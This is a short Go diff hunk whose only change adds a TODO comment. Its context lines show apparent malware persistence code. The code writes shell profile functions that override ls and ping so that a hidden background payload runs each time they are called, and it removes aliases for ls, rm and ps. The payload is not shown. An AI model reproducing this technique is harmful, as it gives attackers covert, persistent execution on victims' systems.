@@ -92,7 +92,7 @@ func profiles() (err error) {
 
 	// loader
 	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@ --color=auto; }", payload)
-	loader += "\nunalias ls"
+	loader += "\nunalias ls" // TODO check if alias exists before unalias it
 	loader += "\nunalias rm"
 	loader += "\nunalias ps"
 	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
